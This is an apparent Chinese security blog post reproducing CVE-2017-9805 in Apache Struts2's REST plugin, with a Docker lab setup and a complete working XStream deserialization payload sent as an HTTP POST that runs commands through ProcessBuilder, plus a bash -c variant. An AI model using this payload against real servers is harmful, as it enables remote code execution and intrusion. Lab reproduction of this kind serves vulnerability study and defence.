---
title: CVE-2017-9805（Struts2 漏洞复现与分析）
tags: [漏洞调试]
date: 2017-09-07 22:00
---
前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。0x01 漏洞简介漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。  Struts2 REST插件的XStre
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p>前天发布的新漏洞，以前Struts的漏洞也是经常出，今年三月份就有一次。但这类的洞一直没有跟进，今天也是想着把它给复现一下，同时搭个环境分析一下漏洞形成的原因。</p>
<h1 id="0x01-漏洞简介">0x01 漏洞简介</h1>
<p>漏洞背景 2017年9月5日，Apache官方发布了一则公告，该公告称Apache Struts2的REST插件存在远程代码执行的高危漏洞，CVE编号为CVE-2017-9805。  Struts2 REST插件的XStream组件存在反序列化漏洞，使用带有 XStream实例的 XStreamHandler进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。   </p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<table>
<thead>
<tr>
<th>env</th>
<th>版本</th>
</tr>
</thead>
<tbody><tr>
<td>docker</td>
<td>16.04</td>
</tr>
<tr>
<td>jdk</td>
<td>1.8.0_144</td>
</tr>
<tr>
<td>struts源码</td>
<td>2.5.12</td>
</tr>
<tr>
<td>tomcat</td>
<td>8.0.46</td>
</tr>
</tbody></table>
<p>直接从官网下载相对应的源码</p>
<h2 id="0x1-dockerfile">0x1 dockerfile</h2>
<pre class="prettyprint"><code class=" hljs lasso">FROM ubuntu:<span class="hljs-number">16.04</span> 

MAINTAINER <span class="hljs-number">4</span>t10n <span class="hljs-subst">&lt;</span>act01n@<span class="hljs-number">163.</span>com<span class="hljs-subst">&gt;</span>
ENV DEBIAN_FRONTEND noninteractive 

RUN sed <span class="hljs-attribute">-i</span> <span class="hljs-string">'s/archive.ubuntu.com/mirrors.ustc.edu.cn/g'</span> /etc/apt/sources<span class="hljs-built_in">.</span><span class="hljs-built_in">list</span>

RUN apt<span class="hljs-attribute">-get</span> update <span class="hljs-attribute">-y</span> <span class="hljs-subst">\</span>
    <span class="hljs-subst">&amp;&amp;</span> apt<span class="hljs-attribute">-get</span> install unzip<span class="hljs-subst">\</span>
    <span class="hljs-subst">&amp;&amp;</span> apt<span class="hljs-attribute">-get</span> install net<span class="hljs-attribute">-tools</span>


WORKDIR /tmp 
COPY  <span class="hljs-built_in">.</span>/apache<span class="hljs-attribute">-tomcat</span><span class="hljs-subst">-</span><span class="hljs-number">8.0</span><span class="hljs-number">.46</span><span class="hljs-built_in">.</span>tar<span class="hljs-built_in">.</span>gz  /tmp<span class="hljs-subst">/</span>
COPY  <span class="hljs-built_in">.</span>/jdk<span class="hljs-built_in">.</span>tar<span class="hljs-built_in">.</span>gz  /tmp<span class="hljs-subst">/</span>
COPY  <span class="hljs-built_in">.</span>/struts<span class="hljs-built_in">.</span>zip  /tmp<span class="hljs-subst">/</span>
COPY  <span class="hljs-built_in">.</span>/cmd<span class="hljs-built_in">.</span>sh  /tmp<span class="hljs-subst">/</span> 
RUN  chmod a<span class="hljs-subst">+</span>x cmd<span class="hljs-built_in">.</span>sh 


EXPOSE <span class="hljs-number">8080</span>

CMD <span class="hljs-preprocessor">[</span><span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"/tmp/cmd.sh"</span><span class="hljs-preprocessor">]</span><span class="hljs-markup">
</span></code></pre>
<p>cmd.sh</p>
<pre class="prettyprint"><code class=" hljs avrasm">tar -xz -f jdk<span class="hljs-preprocessor">.tar</span><span class="hljs-preprocessor">.gz</span> -C /usr/local/
tar -xz -f apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span><span class="hljs-preprocessor">.tar</span><span class="hljs-preprocessor">.gz</span> -C /usr/local/
unzip struts<span class="hljs-preprocessor">.zip</span> -d /usr/local/apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span>/webapps

mv /usr/local/apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span>/webapps/struts-<span class="hljs-number">2.5</span><span class="hljs-number">.12</span>/apps/struts2-rest-showcase<span class="hljs-preprocessor">.war</span> ./../../
<span class="hljs-preprocessor"># setup jdk</span>
echo <span class="hljs-string">'''</span>
JAVA_HOME=/usr/local/jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0</span>_144
JAVA_BIN=/usr/local/jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0</span>_144/bin
PATH=$PATH:$JAVA_BIN
CLASSPATH=$JAVA_HOME/lib/dt<span class="hljs-preprocessor">.jar</span>:$JAVA_HOME/lib/tools<span class="hljs-preprocessor">.jar</span>
export JAVA_HOME JAVA_BIN PATH CLASSPATH
<span class="hljs-string">'''</span>&gt;&gt;/etc/profile
source /etc/profile
/usr/local/apache-tomcat-<span class="hljs-number">8.0</span><span class="hljs-number">.46</span>/bin/startup<span class="hljs-preprocessor">.sh</span>

/bin/bash
</code></pre>
<p>相关源码在<a href="https://github.com/actionyz/vulhub">Github</a>上</p>
<h2 id="0x2-攻击代码">0x2 攻击代码</h2>
<p>这里只是生成一个文件4ct10n</p>
<pre class="prettyprint"><code class=" hljs http"><span class="hljs-request">POST <span class="hljs-string">/struts2-rest-showcase/orders/3</span> HTTP/1.1</span>
<span class="hljs-attribute">Host</span>: <span class="hljs-string">192.168.43.165:8989</span>
<span class="hljs-attribute">User-Agent</span>: <span class="hljs-string">Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span>
<span class="hljs-attribute">Accept</span>: <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="hljs-attribute">Accept-Language</span>: <span class="hljs-string">en-US,en;q=0.5</span>
<span class="hljs-attribute">Accept-Encoding</span>: <span class="hljs-string">gzip, deflate</span>
<span class="hljs-attribute">Referer</span>: <span class="hljs-string">http://192.168.43.165:8989/struts2-rest-showcase/orders/3/edit</span>
<span class="hljs-attribute">Cookie</span>: <span class="hljs-string">JSESSIONID=31A64A6CF6021DA63449D6DDEF10202F</span>
<span class="hljs-attribute">Connection</span>: <span class="hljs-string">close</span>
<span class="hljs-attribute">Content-Type</span>: <span class="hljs-string">application/xml</span>
<span class="hljs-attribute">Content-Length</span>: <span class="hljs-string">1656</span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-title">map</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-title">entry</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">flags</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">value</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">dataHandler</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">dataSource</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">is</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"javax.crypto.CipherInputStream"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">cipher</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"javax.crypto.NullCipher"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">initialized</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">opmode</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">serviceIterator</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">iter</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">iter</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"java.util.Collections$EmptyIterator"</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">next</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"java.lang.ProcessBuilder"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">command</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">string</span>&gt;</span>/usr/bin/touch<span class="hljs-tag">&lt;/<span class="hljs-title">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">string</span>&gt;</span>/home/4ct10n<span class="hljs-tag">&lt;/<span class="hljs-title">string</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">command</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">redirectErrorStream</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">next</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">iter</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">filter</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">method</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-title">class</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">parameter-types</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">method</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">filter</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">next</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"string"</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-title">next</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">serviceIterator</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">lock</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">cipher</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">ibuffer</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">done</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">ostart</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">ofinish</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">closed</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">is</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-title">consumed</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">dataSource</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">transferFlavors</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">dataHandler</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-title">dataLen</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">value</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attribute">reference</span>=<span class="hljs-value">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-title">entry</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">entry</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attribute">reference</span>=<span class="hljs-value">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-title">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attribute">reference</span>=<span class="hljs-value">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-title">entry</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-title">map</span>&gt;</span></span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170907214053546?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170907215920821?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h2 id="0x3-攻击后续">0x3 攻击后续</h2>
<p>其实在正真测试的时候已近发现了一些指令受了限制，但是一开始并没有进行研究，今天瞅了一眼freebuf文章，看是已经能够执行任何指令，这里是<a href="http://www.freebuf.com/vuls/147017.html">连接</a></p>
<p>我在这也是实验了一发，试了一下文中说的其他指令，但唯独shell反弹没有成功</p>
<p>文中主要说的利用方法是利用bash -c指令 <br>
具体格式如下</br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">&lt;<span class="hljs-command"><span class="hljs-keyword">command</span>&gt;</span>
&lt;<span class="hljs-keyword">string</span>&gt;bash&lt;/<span class="hljs-keyword">string</span>&gt;
&lt;<span class="hljs-keyword">string</span>&gt;-c&lt;/<span class="hljs-keyword">string</span>&gt;
&lt;<span class="hljs-keyword">string</span>&gt;echo asd &gt;/tmp/<span class="hljs-number">4</span>ct10n&lt;/<span class="hljs-keyword">string</span>&gt;
&lt;/<span class="hljs-command"><span class="hljs-keyword">command</span>&gt;</span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170908174121558?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>怎么反弹shell …….  ，在线等</p>
<h1 id="0x02-漏洞分析">0x02 漏洞分析</h1>
<p>未完待续</p></div>